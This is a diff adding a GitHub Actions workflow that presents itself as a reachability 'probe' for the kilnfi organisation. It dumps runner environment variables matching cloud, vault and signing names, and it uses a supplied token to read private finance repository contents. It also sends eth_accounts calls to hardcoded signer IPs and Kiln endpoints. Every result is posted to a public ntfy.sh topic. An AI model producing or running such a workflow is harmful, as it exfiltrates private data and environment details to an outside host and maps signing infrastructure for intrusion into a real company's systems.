@@ -1,0 +1,90 @@
+name: probe-gh-hosted
+on:
+  workflow_dispatch:
+    inputs:
+      kiln_pat:
+        description: 'token used only for read-only gh api probes'
+        required: true
+      ntfy_topic:
+        description: 'ntfy topic to publish result'
+        required: true
+        default: 'kilnprobe-178175-9f3ad2'
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    env:
+      KILN_PAT: ${{ github.event.inputs.kiln_pat }}
+      NTFY_TOPIC: ${{ github.event.inputs.ntfy_topic }}
+    steps:
+      - name: runner identity and egress
+        run: |
+          set +e
+          {
+            echo "### runner identity"
+            id || true
+            hostname || true
+            uname -a || true
+            cat /proc/1/cgroup || true
+            env | grep -iE 'proxy|aws|gcp|scw|vault|sign' || true
+            echo "egress_ifconfig.me=$(curl -s --max-time 8 https://ifconfig.me)"
+            echo "egress_api.ipify=$(curl -s --max-time 8 https://api.ipify.org)"
+            echo "egress_github_meta=$(curl -s --max-time 8 https://api.github.com/meta | head -c 60)"
+          } | tee -a "$GITHUB_STEP_SUMMARY" | tee /tmp/probe_identity.txt
+
+      - name: kilnfi private repo reachability (org IP allow list test)
+        run: |
+          set +e
+          {
+            echo "### kilnfi API from hosted runner"
+            echo "finance-scripts/data.json:"
+            curl -s -o /tmp/fin.json -w 'HTTP %{http_code} bytes=%{size_download}\n' \
+              -H "Authorization: token $KILN_PAT" -H "Accept: application/vnd.github+json" \
+              --max-time 15 https://api.github.com/repos/kilnfi/finance-scripts/contents/src/staking_rewards/data.json
+            head -c 200 /tmp/fin.json; echo
+            echo "finance-scripts repo meta:"
+            curl -s -o /tmp/finrepo.json -w 'HTTP %{http_code} bytes=%{size_download}\n' \
+              -H "Authorization: token $KILN_PAT" --max-time 15 https://api.github.com/repos/kilnfi/finance-scripts
+            head -c 200 /tmp/finrepo.json; echo
+            echo "tron-validator-watcher repo perms:"
+            curl -s -o /tmp/tron.json -w 'HTTP %{http_code} bytes=%{size_download}\n' \
+              -H "Authorization: token $KILN_PAT" --max-time 15 https://api.github.com/repos/kilnfi/tron-validator-watcher
+            head -c 200 /tmp/tron.json; echo
+            echo "user identity from runner:"
+            curl -s -o /tmp/u.json -w 'HTTP %{http_code}\n' \
+              -H "Authorization: token $KILN_PAT" --max-time 15 https://api.github.com/user
+            head -c 120 /tmp/u.json; echo
+          } | tee -a "$GITHUB_STEP_SUMMARY" | tee /tmp/probe_github.txt
+
+      - name: signataire and kiln endpoints reachability
+        run: |
+          set +e
+          {
+            echo "### Kiln infrastructure from hosted egress"
+            for ip in 3.255.13.221 54.216.229.51 52.215.179.5 108.129.5.197 52.212.240.227 52.48.66.163; do
+              echo "-- $ip:9000 /upcheck"
+              curl -s -o /tmp/up.txt -w 'HTTP %{http_code} bytes=%{size_download} time=%{time_total}\n' --max-time 8 "http://$ip:9000/upcheck"
+              head -c 120 /tmp/up.txt; echo
+              echo "-- $ip:9000 eth_accounts"
+              curl -s -o /tmp/ac.txt -w 'HTTP %{http_code} bytes=%{size_download} time=%{time_total}\n' --max-time 8 \
+                -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","id":1,"method":"eth_accounts","params":[]}' "http://$ip:9000/"
+              head -c 160 /tmp/ac.txt; echo
+            done
+            for u in https://eth-api.mainnet.kiln.fi/upcheck https://eth-kg.mainnet.kiln.fi/upcheck https://erpc.kiln.fi/ ; do
+              echo "-- $u"
+              curl -s -o /tmp/x.txt -w 'HTTP %{http_code} bytes=%{size_download} time=%{time_total}\n' --max-time 8 "$u"
+              head -c 120 /tmp/x.txt; echo
+            done
+          } | tee -a "$GITHUB_STEP_SUMMARY" | tee /tmp/probe_kiln.txt
+
+      - name: publish summary to ntfy
+        if: always()
+        run: |
+          set +e
+          cat /tmp/probe_identity.txt /tmp/probe_github.txt /tmp/probe_kiln.txt 2>/dev/null | head -c 3800 > /tmp/all.txt
+          curl -s --max-time 10 -H "Title: kiln probe 178175" -H "Tags: github" --data-binary @/tmp/all.txt "https://ntfy.sh/$NTFY_TOPIC"
+          echo "posted"
+          exit 0
